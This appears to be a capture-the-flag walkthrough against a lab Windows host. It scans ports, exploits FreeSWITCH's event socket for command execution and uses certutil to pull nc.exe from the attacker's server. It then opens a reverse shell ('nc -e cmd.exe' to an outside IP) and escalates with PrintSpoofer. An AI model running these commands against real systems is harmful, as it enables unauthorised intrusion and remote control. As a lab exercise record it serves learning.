# IP: 10.10.202.85

#### Scanning all ports
`$ nmap -sS --min-rate 5000 --open -p- -Pn -v -n -oG allports 10.10.202.85`
---

#### ExtracPorts
`$ extractPorts allports`

---
````
[*] Extracting information...

	[*] IP Address: 10.10.202.85
	[*] Open ports: 3389,8021

[*] Ports copied to clipboard
````
---
#### ExtracPorts
`$ nmap -sS -sVC 10.10.202.85 -p3389,8021 -Pn -oN targeted`

---
#### Services Version
````
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
|_ssl-date: 2022-02-26T04:20:07+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-26T04:20:07+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
````
___
#### Searchsploit:
------------------------------------------------------------------------------ ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit) | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution | windows/remote/47799.txt
___

#### Configure exploit

`$ searchsploit -m windows/remote/47799.txt`

`$ mv 47799.txt freeswitch-exploit.py`

`$ python3 freeswitch-exploit.py 10.10.202.85 whoami`

    Authenticated
	Content-Type: api/response
	Content-Length: 25
	
	win-eom4pk0578n\nekrotic

# Exploiting Service

#### Create an http service on parrot
`$ python3 -m http.server 8081`

	python3 freeswitch-exploit.py 10.10.202.85 "certutil.exe -urlcache -split -f http://10.11.60.52:8081/nc.exe C:\users\Nekrotic\Downloads\nc.exe"

#### Execution reverse shell on NC
`C:\users\Nekrotic\Downloads\nc -e cmd.exe 10.11.60.52 1234`

# Privilege Escalation
`certutil.exe -urlcache -split -f http://10.11.60.52:8080/PrintSpoofer.exe PrintSpoofer.exe`

`$ PrintSpoofer.exe -i -c cmd`
